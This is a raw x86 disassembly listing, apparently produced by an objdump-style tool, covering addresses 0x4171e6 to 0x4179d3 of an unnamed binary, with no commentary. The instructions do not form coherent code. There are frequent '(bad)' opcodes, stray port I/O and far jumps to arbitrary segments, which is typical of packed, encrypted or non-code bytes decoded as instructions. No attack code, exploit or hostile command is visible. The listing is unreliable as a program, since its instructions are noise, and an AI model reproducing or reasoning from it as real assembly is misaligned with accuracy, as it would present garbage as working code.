  4171e6:	xchg   esi,eax
  4171e7:	pop    esp
  4171e8:	(bad)  
  4171e9:	dec    edi
  4171ea:	(bad)  
  4171eb:	loop   0x417174
  4171ed:	xor    BYTE PTR [ecx+ecx*4+0x777a0300],cl
  4171f4:	sar    dl,0x9
  4171f7:	enter  0x8d26,0xe8
  4171fb:	dec    eax
  4171fc:	mov    eax,ds:0xab8bef8
  417201:	jle    0x4171bf
  417203:	mov    cl,0x63
  417205:	loop   0x41721e
  417207:	adc    DWORD PTR [eax-0x4b2a9ac8],edi
  41720d:	loop   0x417266
  41720f:	arpl   WORD PTR [edi],bx
  417211:	gs xchg esp,eax
  417213:	scas   al,BYTE PTR es:[edi]
  417214:	int3   
  417215:	xchg   BYTE PTR [edx-0x2c64ee4b],bl
  41721b:	xchg   esp,eax
  41721c:	cmp    bh,0x40
  41721f:	add    eax,0xa2d5cfe6
  417224:	aaa    
  417225:	mov    ebp,0x9bcce6d0
  41722a:	push   ss
  41722b:	stos   DWORD PTR es:[edi],eax
  41722c:	ds jp  0x417206
  41722f:	xchg   al,dl
  417231:	cs sti 
  417233:	ret    
  417234:	adc    BYTE PTR ds:0x7c0e1a93,0xde
  41723b:	dec    ebp
  41723c:	xchg   BYTE PTR [edi-0x67],dl
  41723f:	(bad)  
  417240:	jae    0x4171e5
  417242:	(bad)  
  417243:	daa    
  417244:	jp     0x417224
  417246:	fcmovb st,st(5)
  417248:	outs   dx,BYTE PTR ds:[esi]
  417249:	int    0x5e
  41724b:	inc    edi
  41724c:	fild   DWORD PTR [edi-0x5068384a]
  417252:	jg     0x4172d1
  417254:	setno  dh
  417257:	push   esp
  417258:	pop    edx
  417259:	inc    esi
  41725a:	inc    esi
  41725b:	push   0xffffffd3
  41725d:	sti    
  41725e:	cmp    BYTE PTR [ecx+0x14],ch
  417261:	jle    0x4171f0
  417263:	stc    
  417264:	xlat   BYTE PTR ds:[ebx]
  417265:	cmp    al,0xdb
  417267:	lods   al,BYTE PTR ds:[esi]
  417268:	jae    0x4171f0
  41726a:	cli    
  41726b:	mov    esp,0x7cd0af58
  417270:	ret    0x6b30
  417273:	jmp    0x23b46781
  417278:	push   0x2d
  41727a:	(bad)  
  41727c:	std    
  41727d:	mov    eax,0x4131f613
  417282:	int    0x79
  417284:	sbb    ebp,DWORD PTR [eax+0x22658773]
  41728a:	adc    BYTE PTR [edi+ebp*8+0x78],cl
  41728e:	cs loop 0x417273
  417291:	or     BYTE PTR [eax+0x32d638e1],ch
  417297:	add    BYTE PTR [eax-0x7c],bl
  41729a:	ja     0x41728f
  41729c:	test   al,0x41
  41729e:	jnp    0x4172ef
  4172a0:	cmp    ebx,DWORD PTR [esi-0x47192f6f]
  4172a6:	outs   dx,BYTE PTR ds:[esi]
  4172a7:	sbb    eax,0x1a54b4c4
  4172ac:	inc    ebp
  4172ad:	out    0x33,eax
  4172af:	adc    edx,DWORD PTR [ecx]
  4172b1:	mov    dh,0xa
  4172b3:	and    eax,0x8206a0e9
  4172b8:	dec    edx
  4172b9:	mov    ebx,0xa316574a
  4172be:	push   esp
  4172bf:	jne    0x417287
  4172c1:	daa    
  4172c2:	stos   DWORD PTR es:[edi],eax
  4172c3:	pop    esp
  4172c4:	popa   
  4172c5:	(bad)  [esi-0x2598d2a7]
  4172cb:	dec    esi
  4172cc:	jle    0x4172c4
  4172ce:	adc    ebp,0x4ac327ef
  4172d4:	mov    bl,0xd1
  4172d6:	shr    BYTE PTR [edi+0x66],cl
  4172d9:	sub    eax,0xa3e5e843
  4172de:	jp     0x417285
  4172e0:	jmp    0x417302
  4172e2:	fld    DWORD PTR [ebx]
  4172e4:	sbb    DWORD PTR [edx+0x8195a44],edi
  4172ea:	mov    dl,0x50
  4172ec:	ror    DWORD PTR [edi+0x4de62651],cl
  4172f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f3:	xchg   ecx,eax
  4172f4:	jmp    0xfa8b9225
  4172f9:	out    0x79,al
  4172fb:	das    
  4172fc:	push   0x17
  4172fe:	div    cl
  417300:	dec    esp
  417301:	nop
  417302:	push   0x42a6062f
  417307:	push   eax
  417308:	mov    al,ds:0x8a097f0b
  41730d:	idiv   DWORD PTR [esi+0x6c]
  417310:	jp     0x4172ac
  417312:	sbb    cl,0x36
  417315:	push   0xce2ed90e
  41731a:	cwde   
  41731b:	mov    ds:0xbf621695,al
  417320:	dec    ebp
  417321:	jno    0x4172d4
  417323:	xchg   esp,eax
  417324:	jb     0x417375
  417326:	mov    ecx,0x58d2af5a
  41732b:	fiadd  WORD PTR es:[bp+di]
  41732f:	es xor al,0x9
  417332:	(bad)  
  417333:	xchg   ecx,eax
  417334:	push   0xffffff84
  417336:	arpl   WORD PTR [ebp+0x5a],di
  417339:	fidivr DWORD PTR [esi-0x15ae4620]
  41733f:	clc    
  417340:	pop    ecx
  417341:	das    
  417342:	xor    esi,DWORD PTR [ecx+0x1a]
  417345:	jnp    0x4173af
  417347:	clc    
  417348:	aas    
  417349:	addr16 inc esp
  41734b:	push   esi
  41734c:	fldcw  WORD PTR ds:0xdfb900e2
  417352:	clc    
  417353:	data16 clc 
  417355:	fild   QWORD PTR [edx-0x70]
  417358:	mul    DWORD PTR [esi-0x41]
  41735b:	sub    BYTE PTR [edx-0x46c888bc],cl
  417361:	lds    ecx,FWORD PTR [edx-0x20]
  417364:	popf   
  417365:	popf   
  417366:	pop    ebp
  417367:	out    0xf6,eax
  417369:	ret    
  41736a:	push   0x243f96c8
  41736f:	push   cs
  417370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417371:	mov    ebx,0x8233a6da
  417376:	pcmpgtd mm7,QWORD PTR [ecx]
  417379:	push   0x58
  41737b:	(bad)  
  41737c:	sti    
  41737d:	sbb    DWORD PTR [edx],esi
  41737f:	aad    0xbb
  417381:	mov    ss,WORD PTR [ecx+0x5d]
  417384:	shr    BYTE PTR [edi-0x2f],1
  417387:	popa   
  417388:	in     eax,dx
  417389:	adc    ah,dh
  41738b:	(bad)  
  41738c:	adc    eax,0xa70ea6bb
  417391:	adc    edi,ebx
  417393:	iret   
  417394:	je     0x417412
  417396:	mov    al,0xf7
  417398:	into   
  417399:	ret    
  41739a:	xor    eax,0x86fc6563
  41739f:	mov    bh,0xd6
  4173a1:	mul    DWORD PTR ss:[edi+0x6238357c]
  4173a8:	mov    ah,0xcc
  4173aa:	dec    ecx
  4173ab:	jg     0x4173bf
  4173ad:	xlat   BYTE PTR ds:[ebx]
  4173ae:	popa   
  4173af:	xchg   edx,eax
  4173b0:	adc    ecx,DWORD PTR [esi+0x41]
  4173b3:	ficom  DWORD PTR [ebx]
  4173b5:	imul   ebp,DWORD PTR [edi],0xffffffd9
  4173b8:	loopne 0x41738c
  4173ba:	jns    0x41736b
  4173bc:	(bad)  
  4173bd:	aaa    
  4173be:	mov    ah,0x13
  4173c0:	or     DWORD PTR [esi],0xffffff9e
  4173c3:	test   BYTE PTR [eax+0x35],cl
  4173c6:	mov    bh,0xa2
  4173c8:	pop    ds
  4173c9:	fistp  WORD PTR [esi]
  4173cb:	dec    ebx
  4173cc:	in     eax,0x1e
  4173ce:	cli    
  4173cf:	scas   eax,DWORD PTR es:[edi]
  4173d0:	mov    ch,0x18
  4173d2:	test   al,0xb0
  4173d4:	out    dx,al
  4173d5:	out    0x7a,al
  4173d7:	jmp    0x417425
  4173d9:	out    0x5,eax
  4173db:	xor    edi,ecx
  4173dd:	cmp    edx,esp
  4173df:	cli    
  4173e0:	cwde   
  4173e1:	pop    ebp
  4173e2:	lods   al,BYTE PTR ds:[esi]
  4173e3:	pop    edi
  4173e4:	jae    0x417414
  4173e6:	jnp    0x41737d
  4173e8:	push   ds
  4173e9:	(bad)  [esi+edi*2-0x27227dff]
  4173f0:	cdq    
  4173f1:	xchg   edi,eax
  4173f2:	mov    ebp,0x85a6e932
  4173f7:	stos   BYTE PTR es:[di],al
  4173f9:	push   ebp
  4173fa:	mov    eax,ds:0xb1e1475
  4173ff:	shl    DWORD PTR [ecx],0xf6
  417402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417403:	and    al,0x85
  417405:	xchg   esp,eax
  417406:	adc    al,ah
  417408:	pop    esi
  417409:	mov    DWORD PTR [eax],ebp
  41740b:	(bad)  
  41740c:	jae    0x417473
  41740e:	loope  0x4173cf
  417410:	adc    bl,BYTE PTR [edx+0x830b2bd]
  417416:	jp     0x417443
  417418:	ja     0x4173b3
  41741a:	imul   ebx,DWORD PTR [eax],0x395696db
  417420:	div    edi
  417422:	(bad)  
  417423:	enter  0xbd25,0x62
  417427:	scas   al,BYTE PTR es:[edi]
  417428:	scas   eax,DWORD PTR es:[edi]
  417429:	push   edi
  41742a:	mov    dh,0x75
  41742c:	push   0x39
  41742e:	out    dx,eax
  41742f:	adc    al,0x91
  417431:	cmp    BYTE PTR [ecx],ch
  417433:	pop    edx
  417434:	mov    ebp,0x1af26f9f
  417439:	loopne 0x4173c2
  41743b:	pop    es
  41743c:	mov    al,ds:0xa54ef029
  417441:	fisttp WORD PTR [esi+0x18887ec6]
  417447:	jecxz  0x4174b6
  417449:	dec    eax
  41744a:	mov    al,ds:0x894fbd
  41744f:	xor    dh,BYTE PTR [ebx+0x724d80fd]
  417455:	in     eax,dx
  417456:	pop    es
  417457:	add    edi,DWORD PTR [ecx+0x4d968f7c]
  41745d:	je     0x417458
  41745f:	pop    ecx
  417460:	xchg   edx,eax
  417461:	shl    esp,cl
  417463:	xor    BYTE PTR [edi+0x6a],dl
  417466:	adc    al,0x69
  417468:	fidivr DWORD PTR ds:[eax+0x43]
  41746c:	inc    esp
  41746d:	adc    eax,0x7df0488d
  417472:	push   ebp
  417473:	into   
  417474:	dec    DWORD PTR [ebx+0x1e]
  417477:	stos   DWORD PTR es:[edi],eax
  417478:	scas   eax,DWORD PTR es:[edi]
  417479:	and    eax,0x246dd819
  41747e:	loop   0x41743f
  417480:	shl    DWORD PTR [edi],cl
  417482:	sub    bl,BYTE PTR [ecx-0x431d3ebd]
  417488:	jae    0x417450
  41748a:	out    dx,eax
  41748b:	add    BYTE PTR [eax+0x7798d866],ah
  417491:	int    0x87
  417493:	dec    ebp
  417494:	out    dx,eax
  417495:	aas    
  417496:	stos   DWORD PTR es:[edi],eax
  417497:	xchg   BYTE PTR [edx+0x41fd686d],ah
  41749d:	inc    ebx
  41749e:	cmp    al,0x39
  4174a0:	cmp    ebp,DWORD PTR [ecx]
  4174a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a3:	pop    esi
  4174a4:	mov    ds:0x978e96e,eax
  4174a9:	inc    esi
  4174aa:	(bad)  
  4174ab:	jno    0x417454
  4174ad:	int3   
  4174ae:	push   0x57
  4174b0:	clc    
  4174b1:	loop   0x41750e
  4174b3:	addr16 clc 
  4174b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174b6:	aad    0x8b
  4174b8:	pop    ebx
  4174b9:	(bad)  
  4174ba:	mov    esi,DWORD PTR [ebx]
  4174bc:	dec    eax
  4174bd:	push   0xc7d630dd
  4174c2:	pop    ss
  4174c3:	inc    ebx
  4174c4:	test   eax,ebp
  4174c6:	xlat   BYTE PTR ds:[ebx]
  4174c7:	jmp    0x15a:0xd49b74d4
  4174ce:	dec    esp
  4174cf:	sbb    DWORD PTR [edx+0x495e9728],ecx
  4174d5:	mov    ds:0xb942caad,al
  4174da:	cld    
  4174db:	xchg   esi,eax
  4174dc:	popa   
  4174dd:	push   cs
  4174de:	out    0x1a,eax
  4174e0:	jne    0x4174fc
  4174e2:	and    BYTE PTR [esi+0x7c],cl
  4174e5:	adc    eax,0x6f8e9822
  4174ea:	cwde   
  4174eb:	add    eax,0x418eccd3
  4174f0:	adc    dl,BYTE PTR [ecx]
  4174f2:	imul   ebx,DWORD PTR [ebx-0x76],0xffffff8f
  4174f6:	xor    DWORD PTR [edi],edx
  4174f8:	mov    esi,0xb76d4cc2
  4174fd:	xor    al,0x26
  4174ff:	fiadd  DWORD PTR [ebx+0x55]
  417502:	les    ebp,FWORD PTR [eax+0x39]
  417505:	ror    edx,1
  417507:	pop    esp
  417508:	in     al,0xbd
  41750a:	int    0xab
  41750c:	xchg   esp,eax
  41750d:	lea    eax,[ebx+0x3faceaaa]
  417513:	cmp    esi,edx
  417515:	mov    ecx,0x728ac5f8
  41751a:	outs   dx,BYTE PTR ds:[esi]
  41751b:	out    dx,al
  41751c:	jae    0x41754b
  41751e:	or     edx,esp
  417520:	or     ch,BYTE PTR [ecx]
  417522:	dec    ebx
  417523:	jno    0x4174c0
  417525:	fs daa 
  417527:	sub    al,0x6c
  417529:	sbb    DWORD PTR [eax-0x22b8fea4],eax
  41752f:	aam    0x40
  417531:	int    0xa0
  417533:	in     al,dx
  417534:	inc    ebx
  417535:	out    0x38,al
  417537:	or     al,0x23
  417539:	fwait
  41753a:	stc    
  41753b:	adc    edi,DWORD PTR [edx]
  41753d:	ins    BYTE PTR es:[edi],dx
  41753e:	pop    edx
  41753f:	push   esp
  417540:	clc    
  417541:	adc    DWORD PTR [edi+0x6528ceaf],esp
  417547:	and    edi,DWORD PTR [esi-0x7d882c10]
  41754d:	int3   
  41754e:	push   cs
  41754f:	jne    0x41751b
  417551:	daa    
  417552:	test   al,0xb5
  417554:	sbb    al,0x93
  417556:	adc    edi,ebx
  417558:	and    ecx,DWORD PTR [ebx+0x37a2d1a2]
  41755e:	mov    ebx,0x450a197f
  417563:	inc    esp
  417564:	(bad)  
  417565:	in     eax,dx
  417566:	imul   ebx,ecx,0xfffffff2
  417569:	inc    ebx
  41756a:	imul   edi,DWORD PTR [edx],0xffffffa2
  41756d:	loop   0x417546
  41756f:	push   edx
  417570:	push   ss
  417571:	xor    ah,0x94
  417574:	ret    
  417575:	shr    BYTE PTR [ecx-0x5c],cl
  417578:	push   0x81ab0a36
  41757d:	(bad)  
  41757f:	xor    dl,ah
  417581:	inc    esi
  417582:	stos   DWORD PTR es:[edi],eax
  417583:	gs pop ecx
  417585:	mov    ah,BYTE PTR [esi-0x76]
  417588:	push   ebx
  417589:	daa    
  41758a:	stc    
  41758b:	mov    ebx,0x599340c8
  417590:	sub    dh,bl
  417592:	fcom   QWORD PTR [ebx]
  417594:	ret    
  417595:	bound  eax,QWORD PTR [esi-0x2c1ec628]
  41759b:	inc    ecx
  41759c:	retf   
  41759d:	daa    
  41759e:	adc    al,BYTE PTR [ecx-0x74]
  4175a1:	int3   
  4175a2:	imul   esp,DWORD PTR [esi+ecx*4+0x4e],0x83ec5d16
  4175aa:	int3   
  4175ab:	int3   
  4175ac:	mov    edi,DWORD PTR [ecx+0x55]
  4175af:	sbb    DWORD PTR [esi],ecx
  4175b1:	rcr    DWORD PTR [esi+0x7],cl
  4175b4:	jae    0x4175ec
  4175b6:	push   ecx
  4175b7:	jbe    0x4175de
  4175b9:	push   edx
  4175ba:	jle    0x4175d2
  4175bc:	mov    ch,0x38
  4175be:	jmp    FWORD PTR [edx]
  4175c0:	inc    esp
  4175c1:	xchg   ebx,eax
  4175c2:	jmp    0x4175f0
  4175c4:	leave  
  4175c5:	and    al,0xf
  4175c7:	shl    DWORD PTR [eax+ecx*2-0x25],cl
  4175cb:	leave  
  4175cc:	pusha  
  4175cd:	and    DWORD PTR [edi+0x43],esp
  4175d0:	mov    esp,DWORD PTR [ebp+ecx*2-0x55486d13]
  4175d7:	push   0xbf5e201d
  4175dc:	jne    0x417621
  4175de:	je     0x41763d
  4175e0:	jns    0x4175c3
  4175e2:	xor    DWORD PTR [ebx+ebp*1],eax
  4175e5:	sar    BYTE PTR [ebx+ecx*1+0x506b1378],0xd4
  4175ed:	dec    esi
  4175ee:	out    dx,al
  4175ef:	idiv   BYTE PTR [edi+0x15834506]
  4175f5:	out    dx,eax
  4175f6:	cmp    BYTE PTR [edi+0x1724a03f],0x81
  4175fd:	xchg   ebp,eax
  4175fe:	pop    ebx
  4175ff:	aam    0xf9
  417601:	cmp    al,0xbc
  417603:	cs nop
  417605:	sbb    ebx,DWORD PTR [esi+0x3761103e]
  41760b:	(bad)  
  41760c:	mov    ecx,gs
  41760e:	retf   
  41760f:	call   0x3910:0x16e37e28
  417616:	js     0x4175b8
  417618:	fidiv  DWORD PTR [ecx-0x1d846757]
  41761e:	retf   
  41761f:	imul   eax,DWORD PTR [edx+edx*1+0x6528493d],0xffffffd0
  417627:	lahf   
  417628:	jmp    0x144a6c76
  41762d:	jge    0x4175fe
  41762f:	add    eax,esi
  417631:	lods   eax,DWORD PTR ds:[esi]
  417632:	inc    DWORD PTR [edi+edi*4-0x72c5f65b]
  417639:	sub    BYTE PTR [ebx-0x4e],al
  41763c:	add    eax,ebx
  41763e:	push   esp
  41763f:	(bad)  
  417640:	out    dx,eax
  417641:	jecxz  0x417633
  417643:	xor    bl,ah
  417645:	ins    BYTE PTR es:[edi],dx
  417646:	loope  0x417631
  417648:	inc    ebx
  417649:	push   0x6907a8df
  41764e:	ror    BYTE PTR [edx-0x7c26fddc],1
  417654:	cmp    ebp,DWORD PTR [eax+0x764476d0]
  41765a:	(bad)  
  41765b:	pop    edx
  41765c:	cli    
  41765d:	push   ebx
  41765e:	in     al,dx
  41765f:	mov    DWORD PTR [esi],ebx
  417661:	loop   0x417696
  417663:	jo     0xf6e27c05
  417669:	iret   
  41766a:	pop    edx
  41766b:	inc    esp
  41766c:	and    DWORD PTR [ebx],esi
  41766e:	pop    ebx
  41766f:	pop    esp
  417670:	scas   eax,DWORD PTR es:[edi]
  417671:	pop    es
  417672:	jmp    0x5fb39954
  417677:	(bad)  
  417678:	out    dx,al
  417679:	repz push 0xffffffc1
  41767c:	add    esi,DWORD PTR [ecx+0x38]
  41767f:	outs   dx,BYTE PTR ds:[esi]
  417680:	mov    ss,WORD PTR [ecx]
  417682:	(bad)  [esi+0x38]
  417685:	imul   ecx,edx,0x3d3ff72b
  41768b:	and    DWORD PTR [edi*1-0x10fdd744],0xeacb42b
  417696:	sti    
  417697:	xchg   ecx,eax
  417698:	lahf   
  417699:	mov    ss:0x7f3c278f,eax
  41769f:	adc    DWORD PTR ds:0x506495e8,0xffffffa4
  4176a6:	lods   eax,DWORD PTR ds:[esi]
  4176a7:	mov    BYTE PTR ds:0xe8a97209,al
  4176ad:	lahf   
  4176ae:	jl     0x41765e
  4176b0:	bnd ret 
  4176b2:	imul   edx,DWORD PTR [edi+ecx*2+0x74],0xffffffc8
  4176b7:	repnz dec ecx
  4176b9:	push   edi
  4176ba:	dec    esp
  4176bb:	cmp    al,0xc2
  4176bd:	lods   al,BYTE PTR ds:[esi]
  4176be:	test   BYTE PTR [ecx+edx*2-0x2a],cl
  4176c2:	mov    ebp,0x2580a2eb
  4176c7:	xchg   edi,eax
  4176c8:	mov    ds:0xaa97ef1e,al
  4176cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176ce:	arpl   WORD PTR [esi],cx
  4176d0:	inc    BYTE PTR [edx+0x374aca75]
  4176d6:	pop    ebx
  4176d7:	adc    BYTE PTR [ecx],cl
  4176d9:	mov    ecx,0xc829a15d
  4176de:	jns    0x417741
  4176e0:	and    eax,DWORD PTR [ebx]
  4176e2:	cli    
  4176e3:	dec    edi
  4176e5:	jbe    0x4176ec
  4176e7:	sub    al,0x9c
  4176e9:	in     eax,dx
  4176ea:	push   ecx
  4176eb:	or     dh,BYTE PTR [ebx+0x7b]
  4176ee:	and    bh,bh
  4176f0:	pusha  
  4176f1:	pop    ds
  4176f2:	sbb    cl,dh
  4176f4:	cli    
  4176f5:	sub    dh,BYTE PTR [edx]
  4176f7:	xor    bl,BYTE PTR [ecx]
  4176f9:	mov    ?,WORD PTR [ebx+0x58]
  4176fc:	mov    dl,0xcc
  4176fe:	loopne 0x417717
  417700:	jne    0x417724
  417702:	mov    dl,0x91
  417704:	aas    
  417705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417706:	cmp    al,0x44
  417708:	sahf   
  417709:	out    0x83,al
  41770b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41770c:	push   ebx
  41770d:	cmp    BYTE PTR [eax+edi*8+0x7017def8],bh
  417714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417715:	test   al,0x39
  417717:	out    dx,al
  417718:	and    al,0xf0
  41771a:	data16 rcr BYTE PTR [edx+0x38a89221],0xfa
  417722:	pop    eax
  417723:	shl    BYTE PTR [ecx],cl
  417725:	(bad)  
  417726:	outs   dx,BYTE PTR ds:[esi]
  417727:	test   al,0x85
  417729:	mov    bh,0x3e
  41772b:	dec    edi
  41772c:	aaa    
  41772d:	sbb    cl,BYTE PTR [ecx-0x4c847c08]
  417733:	mov    ah,0x4c
  417735:	int3   
  417736:	in     al,0x6f
  417738:	int3   
  417739:	or     al,0xa9
  41773b:	fst    QWORD PTR [esi+0x6a3b6e26]
  417741:	jo     0x417779
  417743:	test   DWORD PTR ds:0xfacc14fc,ecx
  417749:	out    0x16,al
  41774b:	inc    ebp
  41774c:	popa   
  41774d:	fsubr  DWORD PTR [ecx]
  41774f:	leave  
  417750:	jae    0x4177ad
  417752:	rcl    BYTE PTR [edi+esi*2+0x3b],0xa2
  417757:	mov    eax,0x94b01b28
  41775c:	imul   esi,DWORD PTR [eax-0x5febbfcf],0xffffff9a
  417763:	and    eax,0x1d80b81e
  417768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417769:	xchg   ebp,eax
  41776a:	jae    0x417777
  41776c:	cmp    dl,BYTE PTR [esi]
  41776e:	fistp  QWORD PTR [edi+0x74c2a8ef]
  417774:	mov    dl,0xcd
  417776:	or     al,BYTE PTR [ecx+eiz*4-0x4]
  41777a:	fsub   QWORD PTR [esp+edx*1-0x23a39536]
  417781:	rcr    ah,cl
  417783:	add    ecx,DWORD PTR [ebx+ebp*4-0x55e80471]
  41778a:	mov    ds:0x6b8c76d8,al
  41778f:	or     eax,0x54fe7bca
  417794:	jo     0x417791
  417796:	pop    edx
  417797:	mov    dh,0xf1
  417799:	loopne 0x4177cd
  41779b:	es gs addr16 sbb bl,0xce
  4177a1:	mov    gs,WORD PTR [esi+0x69f02d13]
  4177a7:	leave  
  4177a8:	inc    ebx
  4177a9:	repnz cmp eax,0x85a7a5ff
  4177af:	push   ecx
  4177b0:	pop    ecx
  4177b1:	rol    esp,cl
  4177b3:	cmp    cl,BYTE PTR [edi+0x43dab7ae]
  4177b9:	cld    
  4177ba:	lahf   
  4177bb:	mov    cs,WORD PTR [ecx+0x36]
  4177be:	repz adc DWORD PTR [ecx+0x1f3717f3],esi
  4177c5:	mov    ah,ah
  4177c7:	xor    ch,BYTE PTR [eax-0x2045fa3f]
  4177cd:	repnz mov bh,al
  4177d0:	cli    
  4177d1:	or     esp,DWORD PTR [ebx]
  4177d3:	lods   eax,DWORD PTR ds:[esi]
  4177d4:	or     esp,DWORD PTR [edi+0x31c3c532]
  4177da:	jae    0x41785a
  4177dc:	fbstp  TBYTE PTR [esi+0x69]
  4177df:	je     0x417851
  4177e1:	imul   edi,DWORD PTR [ecx+ebx*4],0xdb30b480
  4177e8:	fsubr  DWORD PTR [ecx+0x4558de45]
  4177ee:	pop    ebp
  4177ef:	in     al,dx
  4177f0:	or     DWORD PTR [ebp-0x6535878d],ecx
  4177f6:	fwait
  4177f7:	outs   dx,BYTE PTR ds:[esi]
  4177f8:	call   0xdc4:0x153c46be
  4177ff:	es jns 0x4177ec
  417802:	mov    esp,0xb4459cf5
  417807:	and    eax,0xfd675250
  41780c:	addr16 call 0xf45bfb8b
  417812:	in     eax,0x2f
  417814:	xor    eax,0xf73060e4
  417819:	ja     0x4177d4
  41781b:	data16 or ch,0x11
  41781f:	mov    DWORD PTR [esi],esp
  417821:	rcl    BYTE PTR [ebx+0x1],cl
  417824:	sbb    BYTE PTR [ebp-0x6b],ch
  417827:	jmp    0x20d10630
  41782c:	add    DWORD PTR [edi+0x65],0x2b473237
  417833:	(bad)  
  417834:	push   ecx
  417835:	fwait
  417836:	push   eax
  417837:	jb     0x417865
  417839:	and    BYTE PTR [eax],ah
  41783b:	cmp    esi,DWORD PTR [ecx-0x3418bcad]
  417841:	xor    BYTE PTR [ecx],bl
  417843:	sar    bl,0x2a
  417846:	inc    ebx
  417847:	ins    BYTE PTR es:[edi],dx
  417848:	and    eax,0xc6650538
  41784d:	aas    
  41784e:	mov    al,0xef
  417850:	mov    bh,0x7b
  417852:	push   es
  417853:	out    dx,al
  417854:	iret   
  417855:	and    DWORD PTR [ebp-0x4],ecx
  417858:	xchg   BYTE PTR [ebx],bl
  41785a:	mov    al,ds:0x4047ca01
  41785f:	cmc    
  417860:	or     DWORD PTR [ebp-0x17],edi
  417863:	mov    esi,0xc8655252
  417868:	shl    cl,0xa9
  41786b:	pop    es
  41786c:	xchg   esp,eax
  41786d:	mov    ah,0x61
  41786f:	ss out dx,eax
  417871:	inc    edi
  417872:	dec    edi
  417873:	stc    
  417874:	push   edi
  417875:	mov    ecx,0x34d1a8e1
  41787a:	cmp    ch,cl
  41787c:	jecxz  0x4178cd
  41787e:	cmp    al,0x21
  417880:	push   ds
  417881:	cmp    al,0xbb
  417883:	mov    bl,0x3
  417885:	jmp    0x1229:0x99b295de
  41788c:	mov    al,ds:0x2606c9b4
  417891:	inc    eax
  417892:	mov    edx,0xb6267397
  417897:	adc    al,0x52
  417899:	pop    ebx
  41789a:	xchg   BYTE PTR [edi+edi*4+0x48],dh
  41789e:	sub    edx,DWORD PTR [edi]
  4178a0:	imul   edi,eax,0x4a2eb6a8
  4178a6:	and    ebp,DWORD PTR [edx-0x57b15b28]
  4178ac:	ret    0x6d43
  4178af:	mov    cl,0xdc
  4178b1:	jle    0x417890
  4178b3:	add    DWORD PTR [edx+0x2d0f01e5],ebp
  4178b9:	shr    BYTE PTR [eax+0x70843b02],cl
  4178bf:	mov    esp,0x8ce6d109
  4178c4:	stc    
  4178c5:	fnstsw WORD PTR [ebp+0x48]
  4178c8:	xor    BYTE PTR [esi-0x6497277b],dh
  4178ce:	push   0x55
  4178d0:	ret    0x26b0
  4178d3:	(bad)  
  4178d4:	sti    
  4178d5:	pop    edi
  4178d6:	xor    dh,BYTE PTR [ecx+0x5d]
  4178d9:	aam    0x72
  4178db:	ja     0x4178db
  4178dd:	push   ss
  4178de:	mov    DWORD PTR [ebx],ecx
  4178e0:	sti    
  4178e1:	mov    cl,0x72
  4178e3:	mov    eax,ds:0x7cae191
  4178e8:	mov    ebp,0x4c7b8f5e
  4178ed:	jp     0x417908
  4178ef:	scas   eax,DWORD PTR es:[edi]
  4178f0:	and    dl,dh
  4178f2:	ss mov gs:0x930c28e,al
  4178f9:	sbb    BYTE PTR [ebx+0x64],ch
  4178fc:	dec    esi
  4178fd:	inc    ebp
  4178fe:	xchg   BYTE PTR [edx],dh
  417900:	test   DWORD PTR [edx+0x9],ebp
  417903:	lea    ebx,[eax+0x2a4b6630]
  417909:	(bad)  [edx-0x25622a48]
  41790f:	pop    eax
  417910:	jl     0x417963
  417912:	jo     0x417977
  417914:	push   esp
  417915:	or     dh,BYTE PTR [edx]
  417917:	addr16 clc 
  417919:	lock in al,0x9a
  41791c:	sbb    al,0xf3
  41791e:	mov    edi,0x5b7f4d12
  417923:	hlt    
  417924:	sub    DWORD PTR [esi],0x36231512
  41792a:	mov    ebp,0xf85fe05c
  41792f:	pop    es
  417930:	aas    
  417931:	push   edi
  417932:	cmp    BYTE PTR [ecx+0x2d147887],0x9a
  417939:	dec    edi
  41793a:	outs   dx,DWORD PTR ds:[esi]
  41793b:	(bad)  
  41793d:	in     eax,0xc2
  41793f:	das    
  417940:	hlt    
  417941:	mov    WORD PTR [ebx+edx*1],ds
  417944:	fimul  DWORD PTR [esi+ebx*4-0x2e]
  417948:	add    eax,DWORD PTR [eax+0x5d852c30]
  41794e:	mov    BYTE PTR [ebx-0x2e144117],bh
  417954:	dec    ecx
  417955:	xchg   edx,eax
  417956:	out    0xb8,eax
  417958:	sub    eax,0x10889d63
  41795d:	leave  
  41795e:	dec    esp
  41795f:	sub    eax,0x2bd0c923
  417964:	pop    dx
  417966:	jae    0x4179ca
  417968:	mov    ds,WORD PTR cs:[eax]
  41796b:	iret   
  41796c:	cmp    esi,DWORD PTR [edx+0x6]
  41796f:	pop    ss
  417970:	mov    ds:0xe03ae3fb,eax
  417975:	jl     0x4179a5
  417977:	in     eax,0x91
  417979:	pop    ss
  41797a:	adc    eax,0x124d9b5d
  41797f:	imul   edi,DWORD PTR [edx+0x68947c79],0xffffff9e
  417986:	das    
  417987:	mov    edi,0xc1012ee6
  41798c:	xor    DWORD PTR [ebx],eax
  41798e:	nop
  41798f:	inc    ecx
  417990:	or     esp,esi
  417992:	inc    eax
  417993:	aaa    
  417994:	xor    BYTE PTR [ebx+0x60],ch
  417997:	mov    edi,0x4e0f579c
  41799c:	xchg   bl,ah
  41799e:	out    0x19,eax
  4179a0:	jae    0x417a10
  4179a2:	scas   al,BYTE PTR es:[edi]
  4179a3:	dec    esi
  4179a4:	dec    edi
  4179a5:	pop    ebp
  4179a6:	and    al,0x6b
  4179a8:	or     BYTE PTR [edi],ah
  4179aa:	ret    0xdee8
  4179ad:	adc    ch,al
  4179af:	push   ebx
  4179b0:	lahf   
  4179b1:	mov    cl,0x83
  4179b3:	cmp    DWORD PTR [ecx+ecx*4-0x629d4fa2],ebp
  4179ba:	xor    ebp,DWORD PTR [edi]
  4179bc:	adc    BYTE PTR [eax-0x41d3f17e],bh
  4179c2:	add    al,0x3f
  4179c4:	sbb    al,0x73
  4179c6:	mov    edx,0x10c07c3e
  4179cb:	js     0x417a03
  4179cd:	rcr    DWORD PTR [esi],0xfa
  4179d0:	dec    ebx
  4179d1:	jle    0x417a37
  4179d3:	push   ss
